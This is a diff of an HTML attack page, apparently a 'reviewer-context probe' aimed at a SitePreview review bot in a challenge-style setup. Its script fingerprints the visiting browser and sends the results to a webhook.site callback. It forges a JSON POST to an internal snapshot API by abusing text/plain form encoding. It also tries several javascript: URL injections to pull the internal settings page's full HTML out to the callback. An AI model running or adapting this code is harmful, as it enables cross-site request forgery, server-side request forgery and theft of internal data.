@@ -1,49 +1,53 @@
 <!doctype html>
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>SitePreview reviewer diagnostic v6</title>
-</head>
+<head><meta charset="utf-8"><title>SitePreview reviewer-context probe v7</title></head>
 <body>
-  <h1>Approve</h1>
-  <button id="approve" onclick="report('clicked-approve')">Approve</button>
-  <button id="reject" onclick="report('clicked-reject')">Reject</button>
-  <form id="snapshot-form" method="POST" enctype="text/plain" target="snapshot-window"
-        action="http://web:3000/api/snapshot">
-    <input name='{"url":"https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source'
-           value='form"}'>
-  </form>
-  <pre id="log"></pre>
-  <script>
-    const hook = 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/event';
-    function report(event, value = '') {
-      document.querySelector('#log').textContent += `${event}: ${value}\n`;
-      (new Image()).src = `${hook}?event=${encodeURIComponent(event)}&value=${encodeURIComponent(value)}&t=${Date.now()}`;
-    }
+<h1>SitePreview reviewer-context probe v7</h1><pre id="output"></pre>
+<script>
+const callback = "https://webhook.site/63195811-1d56-47ad-bbc1-9598f721f419";
+const output = document.querySelector("#output");
+function report(event, value = "") {
+  output.textContent += `${event}: ${value}\n`;
+  const query = new URLSearchParams({event, value: String(value), time: new Date().toISOString()});
+  fetch(`${callback}?${query}`, {mode:"no-cors", credentials:"omit", cache:"no-store", keepalive:true}).catch(() => {});
+}
+function javascriptUrl(event) {
+  const endpoint = JSON.stringify(`${callback}?event=${event}&value=`);
+  return "javascript:(()=>{try{fetch(" + endpoint + "+encodeURIComponent(document.documentElement.outerHTML),{mode:'no-cors',credentials:'omit',keepalive:true})}catch(e){};void 0})()";
+}
+report("v7-start", JSON.stringify({userAgent:navigator.userAgent, webdriver:navigator.webdriver, referrer:document.referrer, opener:Boolean(window.opener), activation:navigator.userActivation && {active:navigator.userActivation.isActive, hasBeenActive:navigator.userActivation.hasBeenActive}}));
+const settingsWindow = window.open("http://web:3000/settings", "sitepreviewSettings");
+report("v7-settings-popup", settingsWindow ? "opened" : "blocked");
 
-    report('v6-start', `${location.href}|${document.referrer}|${navigator.userAgent}`);
+// enctype=text/plain inserts '='. Keeping that byte inside a dummy JSON string
+// produces: {"url":"CALLBACK","ignored":"="}
+const snapshotWindow = window.open("about:blank", "sitepreviewSnapshot");
+const form = document.createElement("form");
+form.method = "POST";
+form.enctype = "text/plain";
+form.action = "http://web:3000/api/snapshot";
+form.target = "sitepreviewSnapshot";
+const input = document.createElement("input");
+input.name = `{"url":"${callback}?event=v7-snapshot-browser&value=visited","ignored":"`;
+input.value = '"}';
+form.append(input); document.body.append(form); form.submit();
+report("v7-snapshot-form", snapshotWindow ? "submitted-popup" : "submitted");
 
-    fetch('http://web:3000/api/snapshot', {
-      method: 'POST',
-      mode: 'no-cors',
-      credentials: 'include',
-      headers: { 'Content-Type': 'text/plain' },
-      body: JSON.stringify({
-        url: 'https://webhook.site/e060f91c-4cc9-4ffd-a145-e43cfa9f1575/snapshot?source=fetch'
-      })
-    }).then(r => report('fetch-resolved', r.type)).catch(e => report('fetch-error', e.name));
-
-    setTimeout(() => {
-      report('form-submit');
-      try {
-        document.querySelector('#snapshot-form').submit();
-        report('form-submit-returned');
-      } catch (e) {
-        report('form-error', e.name);
-      }
-    }, 400);
-    setTimeout(() => report('alive-1s'), 1000);
-    setTimeout(() => report('alive-3s'), 3000);
-  </script>
+setTimeout(() => {
+  if (!settingsWindow) return;
+  try { settingsWindow.location = javascriptUrl("v7-js-location-assignment"); report("v7-js-location-assignment-attempt", "assigned"); }
+  catch (error) { report("v7-js-location-assignment-attempt", `${error.name}:${error.message}`); }
+}, 500);
+setTimeout(() => {
+  try { const result = window.open(javascriptUrl("v7-js-window-open"), "sitepreviewSettings"); report("v7-js-window-open-attempt", result ? "returned-window" : "null"); }
+  catch (error) { report("v7-js-window-open-attempt", `${error.name}:${error.message}`); }
+}, 900);
+setTimeout(() => {
+  try { const anchor = document.createElement("a"); anchor.target = "sitepreviewSettings"; anchor.href = javascriptUrl("v7-js-anchor"); document.body.append(anchor); anchor.click(); report("v7-js-anchor-attempt", "clicked"); }
+  catch (error) { report("v7-js-anchor-attempt", `${error.name}:${error.message}`); }
+}, 1300);
+setTimeout(() => report("v7-complete", "yes"), 1800);
+</script>
 </body>
 </html>
+
